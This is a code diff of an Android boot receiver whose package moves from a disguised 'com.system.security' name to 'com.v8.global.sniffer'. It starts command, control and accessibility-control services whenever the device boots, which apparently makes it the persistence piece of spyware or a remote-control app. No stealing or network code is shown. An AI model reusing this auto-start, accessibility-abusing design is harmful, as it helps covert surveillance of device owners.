@@ -1,4 +1,4 @@
-package com.system.security;
+package com.v8.global.sniffer;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -8,26 +8,9 @@ import android.os.Build;
 public class BootReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
-        String action = intent.getAction();
-        
-        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
-            Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action) ||
-            Intent.ACTION_USER_PRESENT.equals(action)) {
-            
-            startServices(context);
-        }
-    }
-
-    private void startServices(Context context) {
-        Intent commandIntent = new Intent(context, CommandService.class);
-        Intent controlIntent = new Intent(context, ControlService.class);
-        
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            context.startForegroundService(commandIntent);
-            context.startForegroundService(controlIntent);
-        } else {
-            context.startService(commandIntent);
-            context.startService(controlIntent);
+        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
+            context.startService(new Intent(context, MainService.class));
+            context.startService(new Intent(context, AccessibilityControlService.class));
         }
     }
 }
